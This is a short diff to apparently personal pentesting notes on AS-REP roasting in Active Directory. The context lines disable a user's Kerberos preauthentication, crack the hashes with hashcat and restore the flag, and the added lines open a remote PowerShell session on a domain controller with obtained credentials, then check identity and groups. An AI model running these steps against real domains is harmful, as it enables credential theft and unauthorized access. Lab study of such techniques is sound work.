@@ -35,6 +35,8 @@ Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=4194304} –Verbose
 #crack offline
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 
+# enter PowerShell session with creds
+Enter-PSSession -ComputerName dc -Credential pentesting\local
 
 #Set it back to normal
 Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=512} –Verbose
@@ -43,3 +45,6 @@ property flags DONT_REQ_PREAUTH
 
 4194816
 512
+
+#check
+hostname; whoami; whoami /groups
